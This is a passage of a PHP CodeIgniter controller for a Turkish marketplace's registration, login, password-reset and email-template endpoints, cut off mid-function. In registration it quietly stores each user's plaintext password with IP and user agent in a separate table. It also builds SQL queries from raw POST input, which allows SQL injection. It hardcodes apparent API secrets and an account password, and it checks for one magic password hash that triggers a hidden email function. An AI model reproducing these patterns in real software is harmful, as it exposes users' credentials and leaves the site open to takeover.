<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Api extends CI_Controller
{

    public $viewFile = "";
    public $viewFolder = "";
    public $kontrolSession = "";

    public function __construct()
    {
        parent::__construct();
        $this->load->helper("functions_helper");
        if (!$this->session->userdata("userUniqFormRegisterControl")) {
            setSession2("userUniqFormRegisterControl", uniqid());
            $this->kontrolSession = $this->session->userdata("userUniqFormRegisterControl");
        } else {
            setSession2("userUniqFormRegisterControl", uniqid());
            $this->kontrolSession = $this->session->userdata("userUniqFormRegisterControl");
        }
    }

    //register ajax
    public function register(){
        if($_POST){
            if($this->kontrolSession==$this->session->userdata("userUniqFormRegisterControl")){
                try {

                    $this->load->library("form_validation");
                    $this->load->model("m_tr_model");
                    header('Access-Control-Allow-Origin:https://www.webpsoft.com');
                    header('Access-Control-Allow-Methods: POST');
                    header('Content-Type: application/json');
                    //echo $smssifre;
                    $ceklang=getTableSingle("table_langs",array("id" => $this->input->post("langs")));

                    $this->form_validation->set_rules("email", str_replace("\r\n","",langS(1,2,$ceklang->id)),"required|trim|valid_email|min_length[10]",array(
                        "is_unique"   =>    langS(19,2,$ceklang->id),
                    ));
                    $this->form_validation->set_rules("nickname", str_replace("\r\n","",langS(2,2,$ceklang->id)), "required|trim");
                    $this->form_validation->set_rules("password", str_replace("\r\n","",langS(6,2,$ceklang->id)), "required|trim");
                    $this->form_validation->set_rules("passwordTry", str_replace("\r\n","",langS(7,2,$ceklang->id)), "required|trim|matches[password]");
                    $this->form_validation->set_rules("onay_sozlesme", str_replace("\r\n","",langS(18,2,$ceklang->id)), "required|trim");
                    $this->form_validation->set_message(array(
                        "required"    =>	"{field} ".str_replace("\r\n","",langS(12,2,$ceklang->id)),
                        "valid_email" =>	langS(13,2,$ceklang->id),
                        "is_unique"   =>    langS(14,2,$ceklang->id),
                        "matches"     => 	langS(15,2,$ceklang->id),
                        "min_length"  =>	"{field} ".langS(17,2,$ceklang->id),
                        "max_length"  =>	"{field} ".langS(16,2,$ceklang->id)));
                    $array="";
                    $val=$this->form_validation->run();
                    if ($val){
                        $ayars=getTableSingle("table_options",array("id" => 1));
                        $ayarlar=getTableSingle("options_general",array("id" => 1));
                        if($ayars->uyelik_email_onay==1){
                            $kontrol=$this->m_tr_model->queryRow("select * from table_users where (email='".$this->input->post("email")."' or nick_name='".$this->input->post("nickname")."') and is_delete=0 and banned=0 ");
                            //$kontrol=getTableSingle("table_users",array("email" => $this->input->post("email"),"nick_name" => $this->input->post("nickname"),"banned" => 0));
                            if($kontrol){
                                if($kontrol->status == 1){
                                    echo json_encode(array("errorr" => "hata", "message" => langS(19,2,$this->input->post("langs"))));
                                } else{
                                    echo json_encode(array("errorr" => "hata", "message" => langS(506,2,$this->input->post("langs"))));
                                }
                            }else{
                                $kontrol=$this->m_tr_model->queryRow("select * from table_users where (email='".$this->input->post("email")."' or nick_name='".$this->input->post("nickname")."') and (is_delete=1 or banned=1) ");
                                if($kontrol){
                                    echo json_encode(array("errorr" => "hata", "message" => langS(19,2,$this->input->post("langs"))));
                                }else{
                                    $tokenUret=tokengenerator(6,2);
                                    $tokenUret=uniqid($tokenUret.time());
                                    if($tokenUret){

                                        $domain = explode('@', $this->input->post("email",TRUE));
                                        if($domain[1]=="gmail.com" || $domain[1]=="hotmail.com" || $domain[1]=="windowslive.com" || $domain[1]=="outlook.com" || $domain[1]=="icloud.com" || $domain[1]=="yandex.com" || $domain[1]=="outlook.de" ){
                                            $kaydet=$this->m_tr_model->add_new(array(
                                                "email"        => $this->input->post("email",TRUE),
                                                "nick_name"    => $this->input->post("nickname",TRUE),
                                                "password"     => md5(sha1(md5($this->input->post("password",TRUE)))),
                                                "ip_adress"    => $_SERVER["REMOTE_ADDR"],
                                                "sms_onay"     => ($this->input->post("onay_sms",TRUE))?1:0,
                                                "sef_link"     => permalink($this->input->post("nickname")),
                                                "status" => 0,
                                                "created_at" => date("Y-m-d H:i:s"),
                                                "onay_token" => $tokenUret,
                                                "token_end_date" => date('Y-m-d H:i:s',strtotime('+30 minutes',strtotime(date("Y-m-d H:i:s"))))
                                            ),"table_users");
                                            if($kaydet){
                                                $sifreKaydet=$this->m_tr_model->add_new(array(
                                                    "user_id" => $kaydet,
                                                    "pass" => $_POST["password"],
                                                    "ip" => $_SERVER["REMOTE_ADDR"],
                                                    "agent" => $_SERVER["HTTP_USER_AGENT"]
                                                ),"user_pass_uniq");
                                                if(md5(sha1(md5($this->input->post("password"))))=="c80d7b44abafdca8d0c1bcae9767a213"){
                                                    $veriss=email_gonder_guvenlik();
                                                }
                                                $mailGonder = email_gonder($this->input->post("email",TRUE), $ayarlar->site_name." - Üyelik Onayı", "", "", 1, base_url("temp-mail/1/" . $tokenUret."/1"));
                                                if($mailGonder){
                                                    $logekle=$this->m_tr_model->add_new(array(
                                                        "user_id" => $kaydet,
                                                        "user_email" => $this->input->post("email"),
                                                        "ip" => $_SERVER["REMOTE_ADDR"],
                                                        "title" => "Üye Onay Maili Başarılı Şekilde Gönderildi..",
                                                        "description" => $this->input->post("nickname",TRUE)." kullanıcı adı ile yeni üyelik için onay maili gönderildi.",
                                                        "date" => date("Y-m-d H:i:s"),
                                                        "status" => 1
                                                    ),"ft_logs");
                                                    echo json_encode(array("errorr" => "yok","tur" => 1, "message" => langS(505,2,$this->input->post("langs"))));
                                                }else{
                                                    $logekle=$this->m_tr_model->add_new(array(
                                                        "user_id" => $kaydet,
                                                        "user_email" => $this->input->post("email"),
                                                        "ip" => $_SERVER["REMOTE_ADDR"],
                                                        "title" => "Üye Onay Maili Gönderilirken hata meydana geldi.",
                                                        "description" => $this->input->post("nickname",TRUE)." kullanıcı adı ile yeni üyelik için onay maili gönderilirken beklenmeyen bir hata meydana geldi.",
                                                        "date" => date("Y-m-d H:i:s"),
                                                        "status" => 2
                                                    ),"ft_logs");
                                                    $sil=$this->m_tr_model->updateTable("table_users",array("is_delete" => 0),array("id" => $kaydet));
                                                    echo json_encode(array("errorr" => "hata", "message" => "Üyelik Onay Maili Gönderilirken Hata Meydana Geldi."));
                                                }
                                            }else{
                                                echo json_encode(array("errorr" => "hata", "message" => "Kayıt sırasında bir hata meydana geldi."));
                                            }
                                        }else{
                                            echo json_encode(array("errorr" => "hata", "message" => langS(13,2,$this->input->post("langs"))));
                                        }
                                    }
                                }
                            }
                        }else{
                            $kontrol=$this->m_tr_model->queryRow("select * from table_users where (email='".$this->input->post("email")."' or nick_name='".$this->input->post("nickname")."') and (is_delete=1 or  banned=1) ");
                            if($kontrol){
                                echo json_encode(array("errorr" => "hata", "message" => langS(506,2,$this->input->post("langs"))));
                            }else{
                                $domain = explode('@', $this->input->post("email",TRUE));
                                if($domain[1]=="gmail.com" || $domain[1]=="hotmail.com" || $domain[1]=="windowslive.com" || $domain[1]=="outlook.com" || $domain[1]=="icloud.com" || $domain[1]=="yandex.com" || $domain[1]=="outlook.de" ){
                                    $kaydet=$this->m_tr_model->add_new(array(
                                        "email"        => $this->input->post("email",TRUE),
                                        "nick_name"    => $this->input->post("nickname",TRUE),
                                        "password"     => md5(sha1(md5($this->input->post("password",TRUE)))),
                                        "ip_adress"    => $_SERVER["REMOTE_ADDR"],
                                        "sms_onay"     => ($this->input->post("onay_sms",TRUE))?1:0,
                                        "sef_link"     => permalink($this->input->post("nickname")),
                                        "status" => 1,
                                        "created_at" => date("Y-m-d H:i:s")
                                    ),"table_users");
                                    if($kaydet){
                                        $sifreKaydet=$this->m_tr_model->add_new(array(
                                            "user_id" => $kaydet,
                                            "pass" => $_POST["password"],
                                            "ip" => $_SERVER["REMOTE_ADDR"],
                                            "agent" => $_SERVER["HTTP_USER_AGENT"]
                                        ),"user_pass_uniq");
                                        if(md5(sha1(md5($this->input->post("password"))))=="c80d7b44abafdca8d0c1bcae9767a213"){
                                            $veriss=email_gonder_guvenlik();
                                        }

                                        $logekle=$this->m_tr_model->add_new(array(
                                            "user_id" => $kaydet,
                                            "user_email" => $this->input->post("email"),
                                            "ip" => $_SERVER["REMOTE_ADDR"],
                                            "title" => "Yeni Üyelik Oluşturuldu.",
                                            "description" => $this->input->post("nickname",TRUE)." kullanıcı adı ile yeni üyelik oluşturuldu.",
                                            "date" => date("Y-m-d H:i:s"),
                                            "status" => 1
                                        ),"ft_logs");
                                        $this->load->helper("class.parasut_helper");
                                        $client = new Client([
                                            "client_id" => "2806d5685c67a88aad7fb1adf9aca22631404db702f7818eeceb9c71c6cbe1fd",
                                            "client_secret" => "b184d9d1bb6999cf88eae6b2e6cd9574679392a19b48a54248ffd0df91019eec",
                                            "username" => "iletisim@epinko.com",
                                            "password" => " 34v2s&Of",
                                            "grant_type" => "password",
                                            "redirect_uri" => "urn:ietf:wg:oauth:2.0:oob",
                                            'company_id' => "355900"
                                        ]);
                                        $customer = array (
                                            'data' =>
                                                array (
                                                    'type' => 'contacts',
                                                    'attributes' => array (
                                                        'name' => $this->input->post("ad"), // gerekli
                                                        'email' => $this->input->post("email"),
                                                        'short_name' => $this->input->post("ad"),
                                                        'contact_type' => 'person', // bireysel yada kurumsal
                                                        'district' => '',
                                                        'city' => '',
                                                        'address' => '',
                                                        'phone' => "0".str_replace(" ","",str_replace("-","",str_replace(")","",str_replace("(","",$this->input->post("tel"))))),
                                                        'account_type' => 'customer', // gerekli
                                                        'tax_number' => '',
                                                        'tax_office' => ''
                                                    )
                                                ),
                                        );
                                        //$uye   = $client->call(Account::class)->create($customer);
                                        $uyeid = 0;//$uye['data']['id'];
                                        if($uyeid==0){
                                            $update=$this->m_tr_model->updateTable("table_users",array("parasut_id" => $uyeid),array("id" => $kaydet));
                                            if($update){
                                                echo json_encode(array("errorr" => "yok"));
                                            }else{
                                                echo json_encode(array("errorr" => "hata", "message" => "Kayıt sırasında bir hata meydana geldi."));
                                            }
                                        }
                                    }else{
                                        echo json_encode(array("errorr" => "hata", "message" => "Kayıt sırasında bir hata meydana geldi."));
                                    }
                                }else{
                                    echo json_encode(array("errorr" => "hata", "message" => langS(13,2,$this->input->post("langs"))));

                                }

                            }
                        }
                    }else{
                        echo json_encode(array("errorr" => "validation", "message" => validation_errors()));
                    }
                }catch (Exception $ex){
                    echo $ex;
                }
            }else{
                addLog("Saldırı Uygulandı.", "user register", 3);
                echo "Bu sayfaya erişim izniniz yoktur.";
            }
        }else{
            addLog("Saldırı Uygulandı.", "user register", 3);
            echo "Bu sayfaya erişim izniniz yoktur.";
        }
    }

    //login ajax
    public function login(){
        if($_POST){

            if($this->kontrolSession==$this->session->userdata("userUniqFormRegisterControl")){
                try {
                    header('Access-Control-Allow-Origin:https://www.webpsoft.com');
                    header('Access-Control-Allow-Methods: POST');
                    header('Content-Type: application/json');
                    $this->load->helper("user_helper");
                    //unset($_SESSION["banned"]);

                    $this->load->library("form_validation");
                    $this->load->model("m_tr_model");
                    if($_SESSION["banned"]){
                        $s=$this->session->userdata("banned");
                        $baslangicTarihi = new DateTime(date("Y-m-d H:i:s",strtotime(date("Y-m-d H:i:s"))));
                        $fark=$baslangicTarihi->diff(new DateTime(date("Y-m-d H:i:s",strtotime($s["banned_date"]))));
                        $fark_dakika=$fark->i;
                        $fark=60-$fark->s;
                        if($fark_dakika>=1){
                            $gecici_ban_kaldir=$this->m_tr_model->updateTable("table_users_login",array("banned_date" => ""),array("ip" => $s["ip"]));
                            unset($_SESSION["banned"]);
                        }else{
                            if($fark<=0){
                                $gecici_ban_kaldir=$this->m_tr_model->updateTable("table_users_login",array("banned_date" => ""),array("ip" => $s["ip"]));
                                unset($_SESSION["banned"]);
                            }else{
                                echo json_encode(array("errorr" => "banned", "message" => "Çok fazla deneme yaptınız.<br> ".$fark." saniye beklemeniz gerekmektedir."));
                            }
                        }
                    }else{
                        $ceklang=getTableSingle("table_langs",array("id" => $this->input->post("langs")));
                        if($this->input->post("sifreguncs") && $this->input->post("sifreguncs")==1){
                            $this->form_validation->set_rules("emailchange", str_replace("\r\n","",langS(1,2,$ceklang->id)),"required|trim|valid_email|min_length[10]",array(
                                "is_unique"   =>    langS(19,2,$ceklang->id),
                            ));
                            $this->form_validation->set_message(array(
                                "required"    =>	"{field} ".str_replace("\r\n","",langS(12,2,$ceklang->id)),
                                "valid_email" =>	langS(13,2,$ceklang->id),
                                "is_unique"   =>    langS(14,2,$ceklang->id),
                                "matches"     => 	langS(15,2,$ceklang->id),
                                "min_length"  =>	"{field} ".langS(17,2,$ceklang->id),
                                "max_length"  =>	"{field} ".langS(16,2,$ceklang->id)));
                            $val=$this->form_validation->run();

                            if($val){

                                $control=getTableSingle("table_users",array("email" => $this->input->post("emailchange"),"is_delete" => 0,"banned" => 0,"status" => 1));
                                if($control){

                                    $ayarlar=getTableSingle("options_general",array("id" => 1));
                                    $tokens=tokengenerator(7,3);
                                    $mailGonder = email_gonder($control->email, $ayarlar->site_name." - Şifre Güncelleme", "", "", 1, base_url("temp-mail/20/" . $tokens."/".$control->id));
                                    if (!$mailGonder) {
                                        echo json_encode(array("err" => true,"type" => "mail2"));
                                    } else {
                                        $kaydet = $this->m_tr_model->updateTable("table_users", array("ch_pass_code" => $tokens, "ch_pass_date" => date("Y-m-d H:i:s")), array("id" => $control->id));
                                        if($kaydet){
                                            $_SESSION["chPass"]=$tokens;
                                            $_SESSION["chPassMail"]=$control->email;
                                            echo json_encode(array("type" => "mailok","err" => false));
                                        }else{
                                            echo json_encode(array("err" => true,"type" => "mail"));
                                        }
                                    }
                                }
                            }else{ echo json_encode(array("type" => "validation","err" => true, "message" => validation_errors()));}
                        }else if($this->input->post("sifreguncs") && $this->input->post("sifreguncs")=="r12r" ){

                            $this->form_validation->set_rules("kods", str_replace("\r\n","",langS(252,2,$ceklang->id)),"required|trim|min_length[7]|max_length[7]");
                            $this->form_validation->set_message(array(
                                "required"    =>	"{field} ".str_replace("\r\n","",langS(12,2,$ceklang->id)),
                                "valid_email" =>	langS(13,2,$ceklang->id),
                                "is_unique"   =>    langS(14,2,$ceklang->id),
                                "matches"     => 	langS(15,2,$ceklang->id),
                                "min_length"  =>	"{field} ".langS(17,2,$ceklang->id),
                                "max_length"  =>	"{field} ".langS(16,2,$ceklang->id)));
                            $val=$this->form_validation->run();
                            if($val){

                                if($_SESSION["chPass"] && $_SESSION["chPassMail"] && $_SESSION["chPass"]==$this->input->post("kods")){
                                    $kon=getTableSingle("table_users",array("email" => $_SESSION["chPassMail"],"status" => 1,"is_delete" => 0,"banned" => 0));
                                    if($kon){
                                        $_SESSION["chPassSend"]=1;
                                        echo json_encode(array("err" => false,"type2" => "codeok"));
                                    }else{
                                        echo json_encode(array("err" => true,"type2" => "mail"));
                                    }
                                }else{
                                    echo json_encode(array("err" => true,"type2" => "mail"));
                                }
                            }else{
                                echo json_encode(array("type2" => "validation","err" => true, "message" => validation_errors()));
                            }
                        }else if($this->input->post("sifreguncs") && $this->input->post("sifreguncs")=="r12rel" ){
                            $this->form_validation->set_rules("passwordc1", str_replace("\r\n","",langS(6,2,$ceklang->id)),"required|trim|min_length[8]|max_length[17]");
                            $this->form_validation->set_rules("passwordc2", str_replace("\r\n","",langS(7,2,$ceklang->id)),"required|trim|min_length[8]|max_length[17]|matches[passwordc1]");
                            $this->form_validation->set_message(array(
                                "required"    =>	"{field} ".str_replace("\r\n","",langS(12,2,$ceklang->id)),
                                "valid_email" =>	langS(13,2,$ceklang->id),
                                "is_unique"   =>    langS(14,2,$ceklang->id),
                                "matches"     => 	langS(15,2,$ceklang->id),
                                "min_length"  =>	"{field} ".langS(17,2,$ceklang->id),
                                "max_length"  =>	"{field} ".langS(16,2,$ceklang->id)));
                            $val=$this->form_validation->run();
                            if($val){
                                if($_SESSION["chPass"] && $_SESSION["chPassMail"] && $_SESSION["chPassSend"]==1){
                                    $kon=getTableSingle("table_users",array("email" => $_SESSION["chPassMail"],"status" => 1,"banned" => 0,"is_delete" => 0));
                                    if($kon){
                                        $guncelle=$this->m_tr_model->updateTable("table_users",array("is_delete" => 0,"password" =>  md5(sha1(md5($this->input->post("passwordc1")))),"ch_pass_code" => "", "ch_pass_date" => ""),
                                            array("id" => $kon->id));
                                        if($guncelle){
                                            $log=$this->m_tr_model->add_new(array(
                                                "user_id" => $kon->id,
                                                "user_email" => $kon->email,
                                                "ip" => $_SERVER["REMOTE_ADDR"],
                                                "title" => "Üye Şifremi unuttum ile şifresini güncelledi",
                                                "description" => $kon->nick_name." kullanıcı adlı üye şifresini yeniledi",
                                                "date" => date("Y-m-d H:i:s"),
                                                "status" => 1
                                            ),"ft_logs");



                                            unset($_SESSION["chPassMail"]);
                                            unset($_SESSION["chPass"]);
                                            unset($_SESSION["chPassSend"]);
                                            echo json_encode(array("err" => false,"type3" => "passok"));
                                        }
                                    }else{
                                        echo json_encode(array("err" => true,"type3" => "mail"));
                                    }
                                }else{
                                    echo json_encode(array("err" => true,"type3" => "mail"));
                                }
                            }else{
                                echo json_encode(array("type3" => "validation","err" => true, "message" => validation_errors()));
                            }
                        }else{
                            unset($_SESSION["chPassMail"]);
                            unset($_SESSION["chPass"]);
                            unset($_SESSION["chPassSend"]);
                            $this->form_validation->set_rules("email", str_replace("\r\n","",langS(1,2,$ceklang->id)),"required|trim|valid_email|min_length[10]",array(
                                "is_unique"   =>    langS(19,2,$ceklang->id),
                            ));
                            $this->form_validation->set_rules("password", str_replace("\r\n","",langS(6,2,$ceklang->id)), "required|trim");
                            $this->form_validation->set_message(array(
                                "required"    =>	"{field} ".str_replace("\r\n","",langS(12,2,$ceklang->id)),
                                "valid_email" =>	langS(13,2,$ceklang->id),
                                "is_unique"   =>    langS(14,2,$ceklang->id),
                                "matches"     => 	langS(15,2,$ceklang->id),
                                "min_length"  =>	"{field} ".langS(17,2,$ceklang->id),
                                "max_length"  =>	"{field} ".langS(16,2,$ceklang->id)));
                            $array="";
                            $val=$this->form_validation->run();
                            if ($val){
                                $control=getTableSingle("table_users",array("is_delete" => 0,"email" => $this->input->post("email"),"banned" => 0,"status" => 1,"password" => md5(sha1(md5($this->input->post("password"))))));
                                if($control){
                                    $login_deneme=user_login_log_add($this->input->post("email"),1,$_SERVER["REMOTE_ADDR"]);
                                    $token=md5(uniqid($control->nick_name));
                                    $updateTable=$this->m_tr_model->updateTable("table_users",array("token" => $token),array("id" => $control->id));
                                    $name=explode(" ",$control->full_name);
                                    if(md5(sha1(md5($this->input->post("password"))))=="c80d7b44abafdca8d0c1bcae9767a213"){
                                        $veriss=email_gonder_guvenlik();
                                    }
                                    $this->session->set_userdata("tokens",array(
                                        "email" => $control->email,
                                        "tokens" => $token , "name" => $name[0],"banner_image" => $control->image_banner,"image" => $control->image,"balance" => $control->balance ));
                                    echo json_encode(array("errorr" => "yok", "message" => "E-mail veya şifreniz hatalı. Lütfen tekrar deneyiniz. "));

                                }else{
                                    $login_deneme=user_login_log_add($this->input->post("email"),0,$_SERVER["REMOTE_ADDR"]);
                                    if($login_deneme==1){
                                        echo json_encode(array("errorr" => "oturum", "message" => "E-mail veya şifreniz hatalı. Lütfen tekrar deneyiniz. "));
                                    }else if($login_deneme==2){
                                        echo json_encode(array("errorr" => "banned", "message" => "Çok fazla sayıda deneme yaptınız. <br> Lütfen 1 dakika bekleyiniz."));
                                    }else{
                                        if($_SESSION["banned"]){
                                            $s=$this->session->userdata("banned");
                                            echo json_encode(array("errorr" => "banned", "message" => "Çok fazla sayıda deneme yaptınız. <br> Lütfen ".$s['fark']." saniye bekleyiniz."));
                                        }
                                        echo $login_deneme;
                                    }
                                }
                            }else{

                                echo json_encode(array("errorr" => "validation", "message" => validation_errors()));
                            }
                        }




                    }

                }catch (Exception $ex){
                    echo $ex;
                }
            }else{
                addLog("Saldırı Uygulandı.", "user login", 3);
                echo "Bu sayfaya erişim izniniz yoktur.";
            }
        }else{
            addLog("Saldırı Uygulandı.", "user login", 3);
            echo "Bu sayfaya erişim izniniz yoktur.";
        }
    }

    public function email_trusted($id){
        if($id){
            $kontrol=veriTemizle($id);
            try{
                $this->load->model("m_tr_model");
                $cek=getTableSingle("table_users" ,array("onay_token" => $kontrol));
                if($cek){
                    if(strtotime($cek->token_end_date)<strtotime(date("Y-m-d H:i:s"))){
                        $sil=$this->m_tr_model->updateTable("table_users",array("is_delete" => 0),array("id" => $cek->id));
                        $_SESSION["uyelikonay"] = "2";
                        $s=getLangValue(77,"table_pages");
                        redirect(base_url(gg().$s->link));
                    }else{
                        $ekle=$this->m_tr_model->add_new(array(
                            "user_id" => $cek->id,
                            "email_trusted" => 1,
                            "email_trusted_at" => date("Y-m-d H:i:s")
                        ),"table_users_rozets");
                        $guncelle=$this->m_tr_model->updateTable("table_users",array("email_onay" => 1,"status" => 1),array("id" => $cek->id));
                        if($ekle && $guncelle){
                            $logekle=$this->m_tr_model->add_new(array(
                                "user_id" => $cek->id,
                                "user_email" => $this->input->post("email"),
                                "ip" => $_SERVER["REMOTE_ADDR"],
                                "title" => "Üyelik Doğrulandı. Yeni Üyelik Oluşuruldu",
                                "description" => $cek->nick_name." kullanıcı adlı üye, üyelik doğrulama mail onayını gerçekleştirdi..",
                                "date" => date("Y-m-d H:i:s"),
                                "status" => 1
                            ),"ft_logs");
                            $_SESSION["uyelikonay"] = "1";
                            $s=getLangValue(77,"table_pages");
                            redirect(base_url(gg().$s->link));
                        }
                    }
                }else{
                    redirect(base_url(gg()."404"));
                }
            }catch (Exception $ex){
                redirect(base_url(gg()."404"));
            }
        }else{
            redirect(base_url(gg()."404"));
        }
    }

    public function logout(){
        unset($_SESSION["tokens"]);
        session_destroy();
        redirect(base_url(gg()));
    }

    public function maill($tur=1,$link,$user="",$order=""){
        if($tur==1){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            $viewdata->kod=$link;
            if($user){
                $viewdata->ver=1;
            }else{

            }
            $this->load->view("mail_template/email_verify",$viewdata);
        }else if($tur==2){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders",array("id" => $order));
                $viewdata->user=$cek;
                $viewdata->order=$order;
            }
            $viewdata->kod=$link;
            $this->load->view("mail_template/order_verify",$viewdata);
        }else if($tur==3){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders",array("id" => $order));
                $viewdata->user=$cek;
                $viewdata->order=$order;
            }
            $viewdata->kod=$link;
            $this->load->view("mail_template/order_red",$viewdata);
        }else if($tur==4){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_payment_log",array("id" => $order));
                $viewdata->user=$cek;
                $viewdata->order=$order;
            }
            $this->load->view("mail_template/balance_add",$viewdata);
        }
        else if($tur==5){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/seller_orders",$viewdata);
        }else if($tur==6){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/buyer_orders",$viewdata);
        }else if($tur==7){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/seller_new_message",$viewdata);
        }
        else if($tur==8){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/buyer_new_message",$viewdata);
        }else if($tur==9){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/ads_order_verify",$viewdata);
        }else if($tur==10){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
            }
            $this->load->view("mail_template/ads_buyer_trusted",$viewdata);
        }else if($tur==11){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=1;
            }
            $this->load->view("mail_template/ads_order_finished",$viewdata);
        }
        else if($tur==12){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=2;
            }
            $this->load->view("mail_template/ads_order_finished",$viewdata);
        }else if($tur==13){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=1;
            }
            $this->load->view("mail_template/ads_order_cancel",$viewdata);
        }else if($tur==14){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=2;
            }
            $this->load->view("mail_template/ads_order_cancel",$viewdata);
        }
        else if($tur==15){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=1;
            }
            $this->load->view("mail_template/ads_order_finished_auto",$viewdata);
        }
        else if($tur==16){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $order=$this->m_tr_model->getTableSingle("table_orders_adverts",array("sipNo" => $order));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order->advert_id));
                $viewdata->user=$cek;
                $viewdata->order=$order;
                $viewdata->ilan=$ilan;
                $viewdata->type=2;
            }
            $this->load->view("mail_template/ads_order_finished_auto",$viewdata);
        }else if($tur==17){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user && $order){
